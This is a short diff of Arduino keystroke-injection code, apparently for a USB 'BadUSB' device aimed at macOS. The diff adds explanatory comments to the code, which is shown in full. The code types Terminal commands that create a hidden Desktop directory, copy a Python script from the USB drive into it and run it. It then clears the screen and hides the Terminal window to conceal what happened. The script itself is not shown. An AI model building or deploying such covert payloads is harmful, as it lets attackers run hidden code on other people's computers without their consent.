@@ -27,21 +27,21 @@ void loop() {
         Keyboard.releaseAll();
         delay(3000);
 
-        Keyboard.print("mkdir ~/Desktop/.py");
+        Keyboard.print("mkdir ~/Desktop/.py");    //Make a hidden directory on the Desktop
         delay(500);
         Keyboard.press(KEY_RETURN);
         Keyboard.releaseAll();
         delay(500);
         Keyboard.print("cp `find /Volumes -name 'autorun_script.py' -maxdepth 2` ~/Desktop/.py/autorun_script.py");
-        delay(1000);
+        delay(1000);       //copies the script from the USB to the hidden dir
         Keyboard.press(KEY_RETURN);
         Keyboard.releaseAll();
         delay(500);
-        Keyboard.print("python ~/Desktop/.py/autorun_script.py && clear");
+        Keyboard.print("python ~/Desktop/.py/autorun_script.py && clear");  //Runs the script
         delay(500);
         Keyboard.press(KEY_RETURN);
         Keyboard.releaseAll();
-        Keyboard.press(KEY_LEFT_GUI);
+        Keyboard.press(KEY_LEFT_GUI);    //Hides the Terminal window with Command + H
         Keyboard.press('h');
         Keyboard.releaseAll();
         
